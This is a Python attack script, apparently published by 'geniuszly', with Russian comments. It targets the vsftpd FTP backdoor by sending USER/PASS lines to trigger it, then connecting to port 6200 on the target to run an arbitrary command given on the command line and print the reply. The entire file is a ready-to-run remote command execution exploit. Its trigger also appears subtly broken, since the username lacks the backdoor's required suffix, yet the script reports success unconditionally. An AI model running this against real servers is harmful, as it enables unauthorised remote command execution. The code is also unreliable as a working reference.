import socket
import sys
import time
from colorama import Fore, Style, init

# Инициализация colorama
init(autoreset=True)

def display_banner():
    print(Fore.MAGENTA + """
    🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
    🔥     ⚡ VSFTPD Exploit - By geniuszly ⚡     🔥
    🔥  🚀 Triggering backdoors with style! 🚀  🔥
    🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
    """ + Style.RESET_ALL)


def execute_exploit(target_ip, target_port, exec_command):
    try:
        print(Fore.CYAN + '🌐 Инициализация подключения...' + Style.RESET_ALL)
        spin_symbols = "⠁⠂⠄⡀⢀⠠⠐⠈"
        
        for idx in range(12):
            time.sleep(0.08)
            sys.stdout.write("\r" + Fore.YELLOW + '[*] 🚀 Запуск backdoor ' + spin_symbols[idx % len(spin_symbols)] + Style.RESET_ALL)
            sys.stdout.flush()
        
        # Подключение к FTP-серверу
        ftp_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_conn.connect((target_ip, target_port))

        # Отправка фиктивных команд для активации уязвимости
        ftp_conn.sendall(b'USER exploit_user\n')
        ftp_conn.sendall(b'PASS exploit_pass\n')
        time.sleep(1)
        ftp_conn.close()

        print(Fore.GREEN + '\n[✔] Backdoor успешно активирован!' + Style.RESET_ALL)

    except Exception as e:
        print(Fore.RED + f'[-] Ошибка: не удалось активировать backdoor на {target_ip} ({e})' + Style.RESET_ALL)

   # Подключение и выполнение команды
    try:
        print(Fore.CYAN + '[*] 🔍 Подключение к backdoor для выполнения команды...' + Style.RESET_ALL)
        
        # Создание сокета для взаимодействия с backdoor
        backdoor_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_conn.connect((target_ip, 6200))
        
        print(Fore.GREEN + f'[✔] Успешно подключено к backdoor на {target_ip}:6200' + Style.RESET_ALL)
        
        # Отправка команды для выполнения
        exec_command = exec_command + '\n'
        backdoor_conn.sendall(exec_command.encode())

        # Получение ответа и его декодирование
        server_response = backdoor_conn.recv(4096).decode('utf-8')
        print(Fore.GREEN + '[💻] Ответ от сервера:' + Style.RESET_ALL)
        print(Fore.YELLOW + server_response + Style.RESET_ALL)

        backdoor_conn.close()

    except Exception as e:
        print(Fore.RED + f'[-] Ошибка: не удалось подключиться к backdoor на {target_ip}:6200 ({e})' + Style.RESET_ALL)

def main():
    display_banner() 

    # Проверка правильности введённых аргументов
    if len(sys.argv) < 4:
        print(Fore.RED + '❗ Неправильное использование скрипта!')
        print(Fore.YELLOW + '👉 Пример: python3 GenVSFTPDExploit.py <IP адрес> <порт> <команда>' + Style.RESET_ALL)
        sys.exit(1)
    
    # Извлечение аргументов
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    exec_command = sys.argv[3]
    
    # Вызов функции для выполнения эксплуатации уязвимости
    execute_exploit(target_ip, target_port, exec_command)

if __name__ == '__main__':
    main()
